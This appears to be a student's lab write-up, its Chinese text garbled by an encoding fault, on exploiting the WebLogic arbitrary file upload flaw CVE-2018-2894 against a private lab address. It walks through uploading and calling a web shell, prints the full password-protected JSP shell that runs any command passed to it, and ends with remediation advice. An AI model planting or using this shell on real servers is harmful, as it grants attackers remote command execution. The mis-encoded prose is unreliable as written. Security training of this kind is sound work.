# 2021SRE_Winter_SecTask

# Web å®‰å…¨æ–¹å‘è€ƒæ ¸å†…å®¹ï¼š

## ä¸€ã€ç®€å•çš„æ¸—é€

é¦–å…ˆç”¨nmapæ‰«æä¸€ä¸‹çœ‹çœ‹è¿™ä¸ªç«¯å£æœ‰ä»€ä¹ˆæœåŠ¡ï¼š

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled.png)

å‘ç°äº†è¿™ä¸ªOracle weblogicï¼Œåˆ©ç”¨ç™¾åº¦æœç´¢ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ä¹‹ç±»çš„

æœç„¶ï¼Œä¸€æœç´¢å¯çœŸæ˜¯~~æ¼æ´ç™¾å‡º~~å•Šå“ˆï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªæ¼æ´ï¼š

Weblogic ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2018-2894ï¼‰

## äºŒã€æ¼æ´å½±å“ï¼š

> åˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯ä»¥ä¸Šä¼ ä»»æ„jspæ–‡ä»¶ï¼Œè¿›è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚WebLogicç®¡ç†ç«¯æœªæˆæƒçš„ä¸¤ä¸ªé¡µé¢å­˜åœ¨ä»»æ„ä¸Šä¼ getshellæ¼æ´ï¼Œå¯ç›´æ¥è·å–æƒé™ã€‚ä¸¤ä¸ªé¡µé¢åˆ†åˆ«ä¸º/ws_utc/begin.doï¼Œ/ws_utc/config.doã€‚

1. æ‰“å¼€[http://172.23.26.66:7001/ws_utc/config.do](http://172.23.26.66:7001/ws_utc/config.do)é¡µé¢ï¼Œ
2. è®¾ç½®å½“å‰çš„å·¥ä½œè·¯å¾„ä¸º/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
ç›®çš„æ˜¯ä¸ºäº†æˆ‘ä»¬å¯ä»¥ç›´æ¥å¤–ç½‘è®¿é—®ç›®å½•æ— éœ€ä»»ä½•æƒé™ã€‚

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%201.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%201.png)

3.ç‚¹å‡»å®‰å…¨â†’æ·»åŠ â†’é€‰æ‹©æ–‡ä»¶ï¼Œæ—¢å¯ä¸Šä¼ jspé©¬ã€‚

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%202.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%202.png)

4.åˆ©ç”¨bpæŠ“åŒ…ï¼Œè·å–æ—¶é—´æˆ³ã€‚

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%203.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%203.png)

5.ç„¶åè®¿é—®[http://172.23.26.66:7001/ws_utc/css/config/keystore/1614346750144_shell.jsp?pwd=023&i=whoami](http://172.23.26.66:7001/ws_utc/css/config/keystore/1614346750144_shell.jsp?pwd=023&i=whoami)å³å¯å¾—åˆ°æƒ³è¦çš„ç»“æœäº†

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%204.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%204.png)

![2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%205.png](2021SRE_Winter_SecTask%20ea03eb5843674049ac8c77718cb02b91/Untitled%205.png)

```jsx
æ³¨ï¼šæˆ‘åˆ©ç”¨çš„jspğŸä¸ºï¼š
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

- å‚è€ƒæ–‡ç« ï¼š[https://www.freebuf.com/news/topnews/205469.html](https://www.freebuf.com/news/topnews/205469.html)
- [https://blog.csdn.net/weixin_41652128/article/details/102676891?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1bece6c9-d4cc-4b37-8a9e-99e03086b017&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control](https://blog.csdn.net/weixin_41652128/article/details/102676891?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1bece6c9-d4cc-4b37-8a9e-99e03086b017&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control)
- [https://xz.aliyun.com/t/2458](https://xz.aliyun.com/t/2458)

## ä¸‰ã€ä¿®å¤å»ºè®®

1.è®¾ç½®Config.doã€begin.doé¡µé¢ç™»å½•æˆæƒåè®¿é—®ï¼›

2.IPSç­‰é˜²å¾¡äº§å“å¯ä»¥åŠ å…¥ç›¸åº”çš„ç‰¹å¾ï¼›

3.å‡çº§åˆ°å®˜æ–¹æœ€æ–°ç‰ˆæœ¬ã€‚